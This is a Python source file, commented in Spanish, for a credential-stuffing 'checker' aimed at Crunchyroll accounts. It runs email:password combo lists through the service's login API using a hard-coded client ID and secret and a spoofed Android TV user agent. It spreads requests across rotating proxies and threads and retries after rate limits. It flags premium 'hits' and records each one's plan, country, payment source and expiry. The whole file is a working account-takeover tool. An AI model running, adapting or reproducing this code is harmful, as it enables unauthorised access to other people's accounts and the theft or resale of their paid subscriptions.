# checkers/crunchyroll_v2.py
import requests
import json
import os
import sys
import re
import time
import random
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

class CrunchyrollCheckerV2:
    # ===== MAPA DE PAÍSES =====
    COUNTRY_MAP = {
        "AF": "Afghanistan", "AL": "Albania", "DZ": "Algeria", "AD": "Andorra",
        "AO": "Angola", "AG": "Antigua and Barbuda", "AR": "Argentina", "AM": "Armenia",
        "AU": "Australia", "AT": "Austria", "AZ": "Azerbaijan", "BS": "Bahamas",
        "BH": "Bahrain", "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus",
        "BE": "Belgium", "BZ": "Belize", "BJ": "Benin", "BT": "Bhutan",
        "BO": "Bolivia", "BA": "Bosnia and Herzegovina", "BW": "Botswana", "BR": "Brazil",
        "BN": "Brunei", "BG": "Bulgaria", "BF": "Burkina Faso", "BI": "Burundi",
        "KH": "Cambodia", "CM": "Cameroon", "CA": "Canada", "CV": "Cape Verde",
        "CF": "Central African Republic", "TD": "Chad", "CL": "Chile", "CN": "China",
        "CO": "Colombia", "KM": "Comoros", "CG": "Congo", "CD": "DR Congo",
        "CR": "Costa Rica", "CI": "Cote d'Ivoire", "HR": "Croatia", "CU": "Cuba",
        "CW": "Curacao", "CY": "Cyprus", "CZ": "Czech Republic", "DK": "Denmark",
        "DJ": "Djibouti", "DM": "Dominica", "DO": "Dominican Republic", "EC": "Ecuador",
        "EG": "Egypt", "SV": "El Salvador", "GQ": "Equatorial Guinea", "ER": "Eritrea",
        "EE": "Estonia", "ET": "Ethiopia", "FJ": "Fiji", "FI": "Finland",
        "FR": "France", "GA": "Gabon", "GM": "Gambia", "GE": "Georgia",
        "DE": "Germany", "GH": "Ghana", "GR": "Greece", "GD": "Grenada",
        "GT": "Guatemala", "GN": "Guinea", "GW": "Guinea-Bissau", "GY": "Guyana",
        "HT": "Haiti", "HN": "Honduras", "HK": "Hong Kong", "HU": "Hungary",
        "IS": "Iceland", "IN": "India", "ID": "Indonesia", "IR": "Iran",
        "IQ": "Iraq", "IE": "Ireland", "IL": "Israel", "IT": "Italy",
        "JM": "Jamaica", "JP": "Japan", "JO": "Jordan", "KZ": "Kazakhstan",
        "KE": "Kenya", "KI": "Kiribati", "KP": "North Korea", "KR": "South Korea",
        "KW": "Kuwait", "KG": "Kyrgyzstan", "LA": "Laos", "LV": "Latvia",
        "LB": "Lebanon", "LS": "Lesotho", "LR": "Liberia", "LY": "Libya",
        "LI": "Liechtenstein", "LT": "Lithuania", "LU": "Luxembourg", "MO": "Macao",
        "MK": "North Macedonia", "MG": "Madagascar", "MW": "Malawi", "MY": "Malaysia",
        "MV": "Maldives", "ML": "Mali", "MT": "Malta", "MH": "Marshall Islands",
        "MR": "Mauritania", "MU": "Mauritius", "MX": "Mexico", "FM": "Micronesia",
        "MD": "Moldova", "MC": "Monaco", "MN": "Mongolia", "ME": "Montenegro",
        "MA": "Morocco", "MZ": "Mozambique", "MM": "Myanmar", "NA": "Namibia",
        "NR": "Nauru", "NP": "Nepal", "NL": "Netherlands", "NZ": "New Zealand",
        "NI": "Nicaragua", "NE": "Niger", "NG": "Nigeria", "NO": "Norway",
        "OM": "Oman", "PK": "Pakistan", "PW": "Palau", "PS": "Palestine",
        "PA": "Panama", "PG": "Papua New Guinea", "PY": "Paraguay", "PE": "Peru",
        "PH": "Philippines", "PL": "Poland", "PT": "Portugal", "PR": "Puerto Rico",
        "QA": "Qatar", "RO": "Romania", "RU": "Russia", "RW": "Rwanda",
        "SA": "Saudi Arabia", "SN": "Senegal", "RS": "Serbia", "SC": "Seychelles",
        "SL": "Sierra Leone", "SG": "Singapore", "SK": "Slovakia", "SI": "Slovenia",
        "SB": "Solomon Islands", "SO": "Somalia", "ZA": "South Africa", "SS": "South Sudan",
        "ES": "Spain", "LK": "Sri Lanka", "SD": "Sudan", "SR": "Suriname",
        "SZ": "Eswatini", "SE": "Sweden", "CH": "Switzerland", "SY": "Syria",
        "TW": "Taiwan", "TJ": "Tajikistan", "TZ": "Tanzania", "TH": "Thailand",
        "TL": "Timor-Leste", "TG": "Togo", "TO": "Tonga", "TT": "Trinidad and Tobago",
        "TN": "Tunisia", "TR": "Turkey", "TM": "Turkmenistan", "TV": "Tuvalu",
        "UG": "Uganda", "UA": "Ukraine", "AE": "UAE", "GB": "United Kingdom",
        "US": "United States", "UY": "Uruguay", "UZ": "Uzbekistan", "VU": "Vanuatu",
        "VE": "Venezuela", "VN": "Vietnam", "YE": "Yemen", "ZM": "Zambia",
        "ZW": "Zimbabwe",
    }

    PLANS = {"1": "FAN", "4": "MEGA FAN", "6": "ULTIMATE FAN"}

    # ===== CREDENCIALES =====
    CLIENT_ID = "rjs0ltx0dbwkliwxdzdf"
    CLIENT_SECRET = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"
    API_URL = "https://beta-api.crunchyroll.com"

    # ===== USER AGENTS =====
    APP_UA = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
    WEB_UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
              "(KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36")

    @staticmethod
    def _format_proxy(proxy):
        """Formatea el proxy para requests"""
        if not proxy:
            return None
        proxy = proxy.strip()
        if proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
            return proxy
        parts = proxy.split(":")
        if len(parts) == 4:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        if len(parts) == 2:
            return f"http://{parts[0]}:{parts[1]}"
        return f"http://{proxy}"

    @staticmethod
    def check(email: str, password: str, proxy: str = None) -> dict:
        """Verifica una cuenta de Crunchyroll (versión con requests)"""
        session = requests.Session()
        
        proxy_url = CrunchyrollCheckerV2._format_proxy(proxy)
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
            session.verify = False

        try:
            device_id = str(uuid.uuid4())
            anon_id = str(uuid.uuid4())

            # ===== PASO 1: LOGIN =====
            response = session.post(
                f"{CrunchyrollCheckerV2.API_URL}/auth/v1/token",
                data={
                    "grant_type": "password",
                    "username": email,
                    "password": password,
                    "scope": "offline_access",
                    "client_id": CrunchyrollCheckerV2.CLIENT_ID,
                    "client_secret": CrunchyrollCheckerV2.CLIENT_SECRET,
                    "device_type": "Google SDK built for x86",
                    "device_id": device_id,
                    "device_name": "sdk_google_atv_x86",
                },
                headers={
                    "User-Agent": CrunchyrollCheckerV2.APP_UA,
                    "Accept": "application/json",
                    "Accept-Charset": "UTF-8",
                    "Accept-Encoding": "gzip",
                    "Connection": "Keep-Alive",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "ETP-Anonymous-ID": anon_id,
                    "Request-Type": "SignIn",
                },
                timeout=20
            )

            response_text = response.text

            # ===== VERIFICAR RATE LIMIT =====
            if response.status_code == 429 or "too_many_requests" in response_text or "rate limited" in response_text.lower():
                return {"status": "ERROR", "email": email, "password": password, "error": "Rate limit"}

            # ===== VERIFICAR CREDENCIALES INVALIDAS =====
            if any(keyword in response_text for keyword in ("invalid_grant", "invalid_credentials")) or response.status_code in (401, 400):
                return {"status": "INVALID", "email": email, "password": password}

            # ===== PROCESAR RESPUESTA =====
            try:
                data = response.json()
            except:
                return {"status": "ERROR", "email": email, "password": password, "error": "JSON parse fail"}

            token = data.get("access_token", "")
            if not token:
                return {"status": "ERROR", "email": email, "password": password, "error": "No access_token"}

            # ===== HEADERS PARA PETICIONES AUTENTICADAS =====
            def auth_headers():
                return {
                    "Authorization": f"Bearer {token}",
                    "User-Agent": CrunchyrollCheckerV2.WEB_UA,
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                }

            # ===== OBTENER USERNAME =====
            username = ""
            try:
                r = session.get(f"{CrunchyrollCheckerV2.API_URL}/accounts/v1/me/multiprofile", headers=auth_headers(), timeout=20)
                match = re.search(r'"username"\s*:\s*"([^"]+)"', r.text)
                if match:
                    username = match.group(1)
            except:
                pass

            # ===== OBTENER DATOS DE LA CUENTA =====
            r = session.get(f"{CrunchyrollCheckerV2.API_URL}/accounts/v1/me", headers=auth_headers(), timeout=20)
            try:
                account = r.json()
            except:
                account = {}

            external_id = account.get("external_id", "")
            email_verified = account.get("email_verified", False)
            account_id = account.get("account_id", "")

            if not username:
                username = account.get("username", email.split("@")[0])

            # ===== RESULTADO BASE =====
            result = {
                "status": "FREE",
                "email": email,
                "password": password,
                "username": username,
                "email_verified": "Yes" if email_verified else "No",
                "plan": "",
                "plan_tier": "",
                "streams": "",
                "expires": "",
                "renew": "",
                "country": "",
                "payment": "",
                "is_premium": False
            }

            # ===== SI NO HAY EXTERNAL_ID, ES FREE =====
            if not external_id:
                return result

            # ===== OBTENER BENEFICIOS =====
            r = session.get(f"{CrunchyrollCheckerV2.API_URL}/subs/v1/subscriptions/{external_id}/benefits", headers=auth_headers(), timeout=20)
            benefits_text = r.text

            # ===== VERIFICAR SI TIENE SUSCRIPCIÓN =====
            no_sub = any(x in benefits_text for x in (
                "subscription.not_found",
                "Subscription Not Found",
                '"total":0',
                '"subscription_country":""',
            ))

            if no_sub or "concurrent_streams" not in benefits_text:
                return result

            # ===== ES PREMIUM =====
            result["status"] = "HIT"
            result["is_premium"] = True

            # ===== OBTENER STREAMS =====
            stream_match = re.search(r'"concurrent_streams\.(\d+)"', benefits_text)
            if stream_match:
                streams = stream_match.group(1)
                result["streams"] = streams
                result["plan"] = CrunchyrollCheckerV2.PLANS.get(streams, f"PLAN_{streams}")
                result["plan_tier"] = CrunchyrollCheckerV2.PLANS.get(streams, f"PLAN_{streams}")

            # ===== OBTENER PAÍS =====
            country_match = re.search(r'"subscription_country"\s*:\s*"([^"]+)"', benefits_text)
            if country_match:
                cc = country_match.group(1)
                result["country"] = CrunchyrollCheckerV2.COUNTRY_MAP.get(cc, cc)

            # ===== OBTENER MÉTODO DE PAGO =====
            payment_match = re.search(r'"source"\s*:\s*"([^"]+)"', benefits_text)
            if payment_match:
                result["payment"] = payment_match.group(1)

            # ===== OBTENER FECHA DE EXPIRACIÓN =====
            if account_id:
                try:
                    r = session.get(f"{CrunchyrollCheckerV2.API_URL}/subs/v3/subscriptions/{account_id}", headers=auth_headers(), timeout=20)
                    sub_text = r.text

                    expires_match = re.search(r'"expiration_date"\s*:\s*"([^T"]+)', sub_text)
                    if expires_match:
                        result["expires"] = expires_match.group(1)

                    renew_match = re.search(r'"auto_renew"\s*:\s*(true|false)', sub_text)
                    if renew_match:
                        result["renew"] = "Yes" if renew_match.group(1) == "true" else "No"

                    sku_match = re.search(r'"sku"\s*:\s*"([^"]+)"', sub_text)
                    if sku_match:
                        result["sku"] = sku_match.group(1)
                except:
                    pass

            return result

        except requests.exceptions.ProxyError:
            return {"status": "ERROR", "email": email, "password": password, "error": "Proxy dead"}
        except requests.exceptions.Timeout:
            return {"status": "ERROR", "email": email, "password": password, "error": "Timeout"}
        except requests.exceptions.ConnectionError:
            return {"status": "ERROR", "email": email, "password": password, "error": "Connection failed"}
        except Exception as e:
            return {"status": "ERROR", "email": email, "password": password, "error": str(e)[:80]}

    @staticmethod
    def check_with_retry(email: str, password: str, proxy: str = None, retries: int = 2) -> dict:
        """Verifica con reintentos en caso de rate limit"""
        for attempt in range(retries + 1):
            result = CrunchyrollCheckerV2.check(email, password, proxy)
            if result.get("status") != "ERROR" or "Rate limit" not in result.get("error", ""):
                return result
            if attempt < retries:
                time.sleep(4 + random.random() * 3)
        return result

    @staticmethod
    def process_batch(combos: list, proxies: list = None, threads: int = 10) -> list:
        """Procesa un lote de combos con threads"""
        results = []
        stats = {"hit": 0, "free": 0, "bad": 0, "error": 0, "total": len(combos)}

        proxy_index = 0
        proxy_lock = Lock()

        def get_next_proxy():
            nonlocal proxy_index
            if not proxies:
                return None
            with proxy_lock:
                proxy = proxies[proxy_index % len(proxies)]
                proxy_index += 1
                return proxy

        def check_combo(combo):
            email, password = combo
            proxy = get_next_proxy()
            return CrunchyrollCheckerV2.check_with_retry(email, password, proxy)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(check_combo, combo): combo for combo in combos}
            for future in as_completed(futures):
                result = future.result()
                results.append(result)
                
                status = result.get("status", "ERROR")
                if status == "HIT":
                    stats["hit"] += 1
                elif status == "FREE":
                    stats["free"] += 1
                elif status == "INVALID":
                    stats["bad"] += 1
                else:
                    stats["error"] += 1

        return results, stats